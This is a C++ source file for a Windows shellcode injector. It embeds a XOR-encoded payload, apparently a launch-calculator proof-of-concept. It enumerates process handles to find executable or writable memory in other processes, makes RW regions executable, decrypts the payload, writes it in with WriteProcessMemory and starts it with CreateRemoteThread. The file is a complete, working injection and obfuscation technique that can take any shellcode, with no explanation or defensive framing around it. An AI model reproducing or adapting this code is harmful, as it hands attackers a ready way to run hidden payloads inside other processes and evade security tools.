#include <iostream>
#include <Windows.h>
#include "MapMemoryObjects.h"

using namespace std;

struct ProcessInfo {
    HANDLE hProcess;
    PVOID mAddress;
    DWORD pid;
};

typedef NTSTATUS(WINAPI* _SystemFunction033)(
    struct ustring* memoryRegion,
    struct ustring* keyPointer
);

char shellcode[] = "\xf6\x42\x89\xee\xfa\xe2\xca\xa\xa\xa\x4b\x5b\x4b\x5a\x58\x5b\x5c\x42\x3b\xd8\x6f\x42\x81\x58\x6a\x42\x81\x58\x12\x42\x81\x58\x2a\x42\x81\x78\x5a\x42\x5\xbd\x40\x40\x47\x3b\xc3\x42\x3b\xca\xa6\x36\x6b\x76\x8\x26\x2a\x4b\xcb\xc3\x7\x4b\xb\xcb\xe8\xe7\x58\x4b\x5b\x42\x81\x58\x2a\x81\x48\x36\x42\xb\xda\x81\x8a\x82\xa\xa\xa\x42\x8f\xca\x7e\x6d\x42\xb\xda\x5a\x81\x42\x12\x4e\x81\x4a\x2a\x43\xb\xda\xe9\x5c\x42\xf5\xc3\x4b\x81\x3e\x82\x42\xb\xdc\x47\x3b\xc3\x42\x3b\xca\xa6\x4b\xcb\xc3\x7\x4b\xb\xcb\x32\xea\x7f\xfb\x46\x9\x46\x2e\x2\x4f\x33\xdb\x7f\xd2\x52\x4e\x81\x4a\x2e\x43\xb\xda\x6c\x4b\x81\x6\x42\x4e\x81\x4a\x16\x43\xb\xda\x4b\x81\xe\x82\x42\xb\xda\x4b\x52\x4b\x52\x54\x53\x50\x4b\x52\x4b\x53\x4b\x50\x42\x89\xe6\x2a\x4b\x58\xf5\xea\x52\x4b\x53\x50\x42\x81\x18\xe3\x5d\xf5\xf5\xf5\x57\x42\xb0\xb\xa\xa\xa\xa\xa\xa\xa\x42\x87\x87\xb\xb\xa\xa\x4b\xb0\x3b\x81\x65\x8d\xf5\xdf\xb1\xea\x17\x20\x0\x4b\xb0\xac\x9f\xb7\x97\xf5\xdf\x42\x89\xce\x22\x36\xc\x76\x0\x8a\xf1\xea\x7f\xf\xb1\x4d\x19\x78\x65\x60\xa\x53\x4b\x83\xd0\xf5\xdf\x69\x6b\x66\x69\x24\x6f\x72\x6f\xa\xa";

unsigned char* XORDecrypt(unsigned char key, unsigned char* payload, int len) {
    for (int i = 0; i < len; i++) {
        payload[i] = payload[i] ^ key;
    }
    return payload;
}

//void XOR_encrypt(unsigned char key, unsigned char payload[], DWORD len) {
//    for (int i = 0; i < len; i++) {
//        payload[i] ^= key;
//    }
//    for (int i = 0; i < len; i++) {
//        cout << "\\x" << hex << (int)payload[i];
//    }
//    cout << endl;
//}


PVOID FindRW(HANDLE pHandle, SIZE_T mSpace = 0) {
    MEMORY_BASIC_INFORMATION mbi = {};
    LPVOID addr = 0;

    while (VirtualQueryEx(pHandle, addr, &mbi, sizeof(mbi))) {
        addr = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
        if (mbi.Protect == PAGE_READWRITE && mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE) {
            if (mSpace == 0) {
                return mbi.BaseAddress;
            }
            else {
                if (mbi.RegionSize > mSpace) {
                    return mbi.BaseAddress;
                }
                else {
                    return NULL;

                }
            }
        }
    }
    return NULL;
}

PVOID FindRWX(HANDLE pHandle, SIZE_T mSpace = 0) {
    MEMORY_BASIC_INFORMATION mbi = {};
    LPVOID addr = 0;

    while (VirtualQueryEx(pHandle, addr, &mbi, sizeof(mbi))) {
        addr = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
        if (mbi.Protect == PAGE_EXECUTE_READWRITE && mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE) {
            if (mSpace == 0) {
                return mbi.BaseAddress;
            }
            else {
                if (mbi.RegionSize > mSpace) {
                    return mbi.BaseAddress;
                }
                else {
                    return NULL;

                }
            }
        }
    }
    return NULL;
}

ProcessInfo searchForProcess(deque <HANDLE> handlers) {
    PVOID mAddress = NULL;
    DWORD oldProtect;
    ProcessInfo pInfo = ProcessInfo();
    for (int i = 0; i < handlers.size(); i++) {
        mAddress = FindRWX(handlers[i], 0);
        if (mAddress != NULL) {
            cout << "RWX Founded";
            pInfo.hProcess = handlers[i];
            pInfo.mAddress = mAddress;
            pInfo.pid = GetProcessId(handlers[i]);
            break;   
        }
    }
   if (pInfo.hProcess == NULL) {
        for (int i = 0; i < handlers.size(); i++) {
            mAddress = FindRW(handlers[i], 0);
            cout << "RW Founded";
            if (mAddress != NULL) {
                pInfo.hProcess = handlers[i];
                pInfo.mAddress = mAddress;
                pInfo.pid = GetProcessId(handlers[i]);
                VirtualProtectEx(pInfo.hProcess, pInfo.mAddress, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &oldProtect);
                break;
            }
        }
    }
    return pInfo;
}


int main(){
    deque<HANDLE> returnedHandlers;
    PVOID mAddress;
    ProcessInfo pInfo = ProcessInfo();

    MapMemoryObjects mapper = MapMemoryObjects();
    PSYSTEM_HANDLE_INFORMATION mappingResults = mapper.MapMemoryHandlers();
    
    returnedHandlers =  mapper.FilterProcesses(mappingResults);
    pInfo = searchForProcess(returnedHandlers);
    
    XORDecrypt(0x0A, (unsigned char*)shellcode, sizeof(shellcode));
    WriteProcessMemory(pInfo.hProcess, pInfo.mAddress, shellcode, sizeof(shellcode), NULL);

    CreateRemoteThread(pInfo.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) pInfo.mAddress, NULL, 0, NULL);

}


